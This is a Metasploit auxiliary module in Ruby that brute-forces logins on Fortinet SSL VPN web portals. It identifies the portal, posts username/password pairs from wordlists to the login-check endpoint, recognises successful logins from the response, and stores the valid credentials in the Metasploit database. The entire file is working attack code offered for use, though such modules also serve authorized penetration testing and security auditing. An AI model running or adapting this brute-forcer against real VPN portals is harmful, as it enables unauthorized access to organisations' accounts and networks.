##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Fortinet SSL VPN Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Fortinet SSL VPN web login portals and
        performs login brute force to identify valid credentials.
      },
      'Author'         => [ 'Max Michels <kontakt[at]maxmichels.de>' ],
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'SSL' => true,
          'RPORT' => 443
        }
    ))

    register_options(
      [
        OptString.new('DOMAIN', [false, "Domain/Realm to use for each account", ''])
      ])
  end

  def run_host(ip)
    unless check_conn?
      vprint_error("Connection failed, Aborting...")
      return false
    end

    unless is_app_ssl_vpn?
      vprint_error("Application does not appear to be Fortinet SSL VPN. Module will not continue.")
      return false
    end

    vprint_good("Application appears to be Fortinet SSL VPN. Module will continue.")

    vprint_status("Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  # Verify if server is responding
  def check_conn?
    begin
      res = send_request_cgi('uri' => '/', 'method' => 'GET')
      if res
        vprint_good("Server is responsive...")
        return true
      end
    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
    end
    false
  end

  def get_login_resource
    send_request_raw(
      'uri' => '/remote/login?lang=en'
    )
  end

  # Verify whether we're working with SSL VPN or not
  def is_app_ssl_vpn?
    res = get_login_resource
    res && res.code == 200 && res.body.match(/fortinet/)
  end

  def do_logout(cookie)
    send_request_cgi(
      'uri' => '/remote/logout',
      'method' => 'GET',
      'cookie' => cookie
    )
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: 'Fortinet SSL VPN',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: DateTime.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  # Brute-force the login page
  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")

    begin
      post_params = {
        'ajax'  => '1',
        'username' => user,
        'credential' => pass
      }

      #check to use domain/realm or not
      if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?
        post_params['realm'] = ""
      else
        post_params['realm'] = datastore['DOMAIN']
      end

      res = send_request_cgi(
              'uri' => '/remote/logincheck',
              'method' => 'POST',
              'ctype' => 'application/x-www-form-urlencoded',
              'vars_post' => post_params
            )

      if res &&
         res.code == 200 &&
         res.body.match(/redir=/) &&
         res.body.match(/&portal=/)

        do_logout(res.get_cookies)
        if datastore['DOMAIN'].nil? || datastore['DOMAIN'].empty?
          print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
          report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
          report_note(ip: rhost, type: "fortinet.ssl.vpn",data: "User: #{user}")
        else
          print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}:#{datastore["DOMAIN"]}")
          report_cred(ip: rhost, port: rport, user: user, password: pass, proof: res.body)
          report_note(ip: rhost, type: "fortinet.ssl.vpn",data: "User: #{user} / Domain: #{datastore["DOMAIN"]}")
        end

        return :next_user

      else
        vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
      end

    rescue ::Rex::ConnectionRefused,
           ::Rex::HostUnreachable,
           ::Rex::ConnectionTimeout,
           ::Rex::ConnectionError,
           ::Errno::EPIPE
      vprint_error("HTTP Connection Failed, Aborting")
      return :abort
    end
  end
end
